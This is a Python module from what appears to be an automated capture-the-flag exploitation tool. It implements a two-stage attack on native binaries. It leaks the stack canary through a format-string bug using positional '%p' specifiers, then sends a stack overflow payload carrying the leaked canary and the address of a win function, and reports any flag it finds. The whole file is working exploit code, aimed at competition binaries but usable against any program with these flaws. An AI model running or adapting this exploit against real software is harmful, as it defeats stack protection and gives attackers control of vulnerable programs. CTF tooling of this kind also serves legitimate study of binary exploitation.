"""Format-string canary leak + overflow + ret2win (multi-stage).

For binaries that:
  * pass a user buffer to printf as its format (a leak primitive), and
  * later overflow a stack buffer with read()/gets past a stack canary.

Stage 1: send "%p %p ..." into the leaked buffer; parse the canary out of the
         printf output (a qword whose low byte is 0x00 and whose top byte is
         non-zero -- i.e. not a user-space pointer).
Stage 2: overflow = pad-to-canary + canary + saved-rbp + p64(win).
"""
import re
import time

from pwn import p64

from .base import Strategy
from .. import report

_HEX = re.compile(rb"0x[0-9a-fA-F]+")


def _drain(io, total=2.0):
    """Accumulate everything the target sends within `total` seconds."""
    data = b""
    end = time.time() + total
    while time.time() < end:
        try:
            chunk = io.recv(4096, timeout=0.3)
        except Exception:
            break
        if not chunk:
            break
        data += chunk
    return data


def pick_canary(data):
    """Choose the leaked qword that looks like a stack canary."""
    vals = []
    for m in _HEX.finditer(data):
        try:
            vals.append(int(m.group(0), 16))
        except ValueError:
            pass
    # canary: low byte 0x00, non-zero, top byte non-zero (user ptrs are < 2^47)
    strong = [v for v in vals if v and (v & 0xff) == 0 and (v >> 56) != 0]
    if strong:
        return strong[0]
    # fallback: low byte 0, not an obvious 0x7f.. pointer
    weak = [v for v in vals if v and (v & 0xff) == 0 and (v >> 40) != 0x7f]
    return weak[0] if weak else None


class FmtLeakRet2Win(Strategy):
    name = "fmt-leak-ret2win"
    desc = "leak the canary via a format string, then overflow to a win function"

    def _win(self, ctx):
        if getattr(ctx.args, "target", None):
            return int(ctx.args.target, 16), "cli --target"
        a = ctx.analysis
        if a.win_funcs:
            n, addr = a.win_funcs[0]
            return addr, f"win symbol '{n}'"
        if a.flag_block:
            return a.flag_block, "flag block"
        return None, "no target"

    def detect(self, ctx):
        a = ctx.analysis
        ov = a.overflow_input()
        leak = a.fmt_leaks
        tgt, _ = self._win(ctx)
        if not ov or not leak:
            return 0, "needs a format-string leak + an overflow read"
        if tgt is None:
            return 0, "no win function / flag block to jump to"
        if ctx.binary.pie:
            return 20, "PIE: would also need a code/base leak"
        # the signature case: a canary to defeat + a leak to defeat it with
        if ctx.binary.canary:
            return 88, "format-string leak defeats the stack canary -> ret2win"
        return 55, "format-string leak available; ret2win likely simpler"

    def run(self, ctx, io):
        a = ctx.analysis
        ov = a.overflow_input()
        win, why = self._win(ctx)
        if ov is None or win is None:
            report.warn("fmt-leak: missing overflow site or target")
            return None
        canary_off = a.canary_off if a.canary_off is not None else -0x8

        report.ok(f"fmt-leak-ret2win: leak canary, then ret2win -> {hex(win)} [{why}]")

        canary = None
        leak_set = set(a.fmt_leaks)

        for inp in a.inputs:
            if inp.off in leak_set and canary is None:
                # the canary sits (canary_off - leak_off)/8 stack slots past the
                # format buffer; the buffer itself is a few positions in, so we
                # leak a positional band around that distance with %N$p.
                dist = (canary_off - inp.off) // 8
                size = inp.size or 60
                positions, fmt = [], b""
                p = dist + 2
                while p < dist + 12:
                    piece = b"|%" + str(p).encode() + b"$p"
                    if len(fmt) + len(piece) + 1 > size - 1:
                        break
                    fmt += piece
                    positions.append(p)
                    p += 1
                fmt += b"|"
                report.step(f"Stage 1: format-string leak, positions "
                            f"{positions[0]}..{positions[-1]} (slot dist {dist})")
                io.send(fmt + b"\n")
                data = _drain(io, total=2.0)
                canary = pick_canary(data)
                if canary is None:
                    report.warn("could not identify the canary in the leak")
                    return None
                report.ok(f"leaked canary = {hex(canary)}")
            elif inp is ov:
                if ctx.binary.canary and canary is None:
                    report.warn("overflow reached before the canary was leaked")
                    return None
                pad = canary_off - inp.off
                payload = b"A" * pad
                if ctx.binary.canary:
                    payload += p64(canary)
                    junk = 8 - (canary_off + 8)          # bytes up to RET
                    payload += b"B" * max(0, junk)
                else:
                    payload = b"A" * (8 - inp.off)        # straight to RET
                payload += p64(win)
                report.step(f"Stage 2: overflow {len(payload)}B "
                            f"(pad={pad}, +canary, -> {hex(win)})")
                io.send(payload + b"\n")
            else:
                try:
                    io.sendline(b"AUTOSCRAM")            # satisfy other prompts
                except Exception:
                    pass

        try:
            rest = io.recvall(timeout=5).decode(errors="replace")
        except Exception:
            rest = ""
        if rest.strip():
            report.info("Target output:")
            print(rest)
        m = re.search(ctx.flag_re, rest)
        if m:
            report.ok(f"FLAG: {m.group(0)}")
            return m.group(0)
        # exploit reached the win path (output after the overflow) but no flag:
        # locally the FLAG env var is usually unset -- it lives on the remote.
        if rest.strip() and ctx.analysis.getenv_flag:
            report.ok("Exploit SUCCEEDED (reached the win function), but no "
                      "flag string was printed.")
            report.warn("The flag comes from getenv(\"FLAG\"), which is only set "
                        "on the CTF server. Re-run with --remote HOST:PORT, or "
                        "test locally with  FLAG='FLAG{test}' python3 autoscram.py ...")
            return "WIN_REACHED_NO_FLAG"
        return None
